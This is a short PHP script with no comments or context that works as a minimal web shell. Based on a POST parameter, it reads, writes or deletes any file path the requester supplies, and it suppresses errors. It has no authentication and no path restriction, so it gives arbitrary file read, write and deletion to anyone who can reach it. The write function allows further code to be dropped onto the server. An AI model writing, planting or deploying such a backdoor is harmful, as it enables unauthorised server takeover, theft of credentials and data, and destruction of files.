<?php
error_reporting(0);
switch($_POST['m']) {
    case 'r':
        die(file_get_contents($_POST['f']));
    
    case 'w':
        die(file_put_contents($_POST['f'], $_POST['c']));
    
    case 'd':
        die(unlink($_POST['f']));
}